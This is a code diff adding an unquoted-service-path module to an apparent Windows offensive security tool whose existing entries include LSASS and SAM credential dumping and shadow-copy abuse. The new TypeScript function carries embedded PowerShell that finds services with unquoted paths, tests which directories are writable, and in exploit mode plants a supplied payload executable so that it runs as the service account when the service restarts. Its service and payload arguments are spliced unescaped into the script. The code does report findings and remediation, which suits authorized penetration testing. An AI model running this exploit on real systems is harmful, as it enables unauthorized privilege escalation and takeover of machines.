@@ -422,6 +422,10 @@ shadow_copy_abuse: {
     description: "Volume Shadow Copy abuse for credential extraction — enumerate existing shadow copies, exploit HiveNightmare/SeriousSAM (CVE-2021-36934) to read SAM/SYSTEM/SECURITY from shadow copies as unprivileged user, or create new shadow copies for privileged file access",
     args: "--action enum|exploit|create [--outdir PATH]",
   },
+unquoted_service_path: {
+    description: "Find and exploit unquoted service paths — enumerate services with spaces in unquoted binary paths, check writable directories at each truncation point, and optionally place a payload for privilege escalation when the service restarts",
+    args: "--action enum|exploit [--service SERVICE_NAME] [--payload EXE_PATH]",
+  },
 } as const satisfies Record<string, { description: string; args: string }>
 
 type Program = keyof typeof PROGRAMS
@@ -14761,6 +14765,163 @@ if ($shadow.ReturnValue -eq 0) {
   return { output: output.join("\n"), findings }
 }
 
+async function unquotedServicePath(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "enum"
+  const service = argVal(args, "--service")
+  const payload = argVal(args, "--payload")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Unquoted Service Path analysis...\n"]
+
+  if (action === "enum") {
+    const script = `
+# Enumerate all services with unquoted paths containing spaces
+$services = Get-CimInstance Win32_Service -ErrorAction SilentlyContinue | Where-Object {
+    $_.PathName -and
+    $_.PathName -notmatch '^\s*"' -and
+    $_.PathName -match ' '
+}
+
+if (-not $services) {
+    Write-Output "[-] No unquoted service paths with spaces found"
+    exit 0
+}
+
+Write-Output "[+] Found $($services.Count) service(s) with unquoted paths:`n"
+
+foreach ($svc in $services) {
+    Write-Output "  Service: $($svc.Name)"
+    Write-Output "  Display: $($svc.DisplayName)"
+    Write-Output "  Path:    $($svc.PathName)"
+    Write-Output "  State:   $($svc.State)"
+    Write-Output "  Start:   $($svc.StartMode)"
+    Write-Output "  RunAs:   $($svc.StartName)"
+
+    # Parse the binary path (strip arguments after .exe)
+    $binPath = $svc.PathName
+    if ($binPath -match '^(.+?\\.exe)') { $binPath = $Matches[1] }
+
+    # Find truncation points (every space)
+    $parts = $binPath -split ' '
+    $truncPaths = @()
+    for ($i = 1; $i -lt $parts.Count; $i++) {
+        $candidate = ($parts[0..($i-1)] -join ' ') + '.exe'
+        $truncPaths += $candidate
+    }
+
+    Write-Output "  Truncation candidates:"
+    foreach ($tp in $truncPaths) {
+        $dir = Split-Path $tp -Parent
+        $writable = $false
+        if (Test-Path $dir) {
+            try {
+                $acl = Get-Acl $dir -ErrorAction SilentlyContinue
+                $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+                $currentGroups = ([System.Security.Principal.WindowsIdentity]::GetCurrent()).Groups | ForEach-Object {
+                    try { $_.Translate([System.Security.Principal.NTAccount]).Value } catch { $_.Value }
+                }
+                foreach ($ace in $acl.Access) {
+                    $id = $ace.IdentityReference.Value
+                    if (($id -eq $currentUser -or $currentGroups -contains $id -or $id -eq 'BUILTIN\\Users' -or $id -eq 'Everyone') -and
+                        $ace.AccessControlType -eq 'Allow' -and
+                        ($ace.FileSystemRights -band [System.Security.AccessControl.FileSystemRights]::Write)) {
+                        $writable = $true
+                    }
+                }
+            } catch {}
+        }
+        $status = if ($writable) { "[WRITABLE!]" } else { "[not writable]" }
+        Write-Output "    $status $tp"
+    }
+    Write-Output ""
+}
+`
+    const result = await ps(script, timeout)
+    output.push(result.stdout)
+
+    const vulnCount = (result.stdout.match(/\[WRITABLE!\]/g) || []).length
+    const svcCount = (result.stdout.match(/Service:/g) || []).length
+
+    if (svcCount > 0) {
+      findings.push({
+        checkId: "WIN-PRIVESC-UQP-001",
+        provider: "windows",
+        severity: vulnCount > 0 ? "critical" : "medium",
+        status: vulnCount > 0 ? "VULNERABLE" : "ENUMERATED",
+        resource: "services://unquoted-paths",
+        title: `${svcCount} unquoted service path(s) found, ${vulnCount} with writable directories`,
+        details: result.stdout.substring(0, 500),
+        remediation: "Enclose service binary paths in double quotes. Remove write permissions from service directories for non-admin users.",
+      })
+    }
+  } else if (action === "exploit") {
+    if (!service) return { output: "[!] Required: --service SERVICE_NAME --payload EXE_PATH", findings }
+    if (!payload) return { output: "[!] Required: --payload EXE_PATH (path to your exe)", findings }
+
+    const script = `
+$svc = Get-CimInstance Win32_Service -Filter "Name='${service}'" -ErrorAction SilentlyContinue
+if (-not $svc) {
+    Write-Output "[-] Service '${service}' not found"
+    exit 1
+}
+
+$binPath = $svc.PathName
+Write-Output "[*] Service: ${service}"
+Write-Output "[*] Path: $binPath"
+Write-Output "[*] RunAs: $($svc.StartName)"
+
+if ($binPath -match '^\s*"') {
+    Write-Output "[-] Path is already quoted — not vulnerable"
+    exit 1
+}
+
+# Find first writable truncation point
+$parts = $binPath -split ' '
+$targetPath = $null
+for ($i = 1; $i -lt $parts.Count; $i++) {
+    $candidate = ($parts[0..($i-1)] -join ' ') + '.exe'
+    $dir = Split-Path $candidate -Parent
+    if (Test-Path $dir) {
+        try {
+            [System.IO.File]::Create("$dir\\.cs_test_write").Close()
+            Remove-Item "$dir\\.cs_test_write" -Force
+            $targetPath = $candidate
+            break
+        } catch {}
+    }
+}
+
+if (-not $targetPath) {
+    Write-Output "[-] No writable truncation point found"
+    exit 1
+}
+
+Write-Output "[+] Writable truncation point: $targetPath"
+Write-Output "[*] Copying payload..."
+Copy-Item "${payload}" $targetPath -Force
+Write-Output "[+] Payload placed at: $targetPath"
+Write-Output "[*] Restart the service to trigger: Restart-Service ${service}"
+Write-Output "[!] Remember to clean up: Remove-Item '$targetPath'"
+`
+    const result = await ps(script, timeout)
+    output.push(result.stdout)
+
+    if (result.stdout.includes("Payload placed")) {
+      findings.push({
+        checkId: "WIN-PRIVESC-UQP-002",
+        provider: "windows",
+        severity: "critical",
+        status: "EXPLOITED",
+        resource: `service://${service}`,
+        title: `Unquoted service path exploited: ${service}`,
+        details: `Payload placed at truncation point. Restart service to execute as ${service} service account.`,
+        remediation: "Remove the placed binary, quote the service path, restrict directory write permissions.",
+      })
+    }
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
 const dispatch: Record<Program, (args: string[], timeout: number) => Promise<HookResult>> = {
   lsass_dump: lsassDump,
   sam_dump: samDump,
@@ -14847,6 +15008,7 @@ const dispatch: Record<Program, (args: string[], timeout: number) => Promise<Hoo
   named_pipe_privesc: namedPipePrivesc,
   always_install_elevated: alwaysInstallElevated,
   shadow_copy_abuse: shadowCopyAbuse,
+  unquoted_service_path: unquotedServicePath,
 }
 
 export const WinhookTool = Tool.define("winhook", {
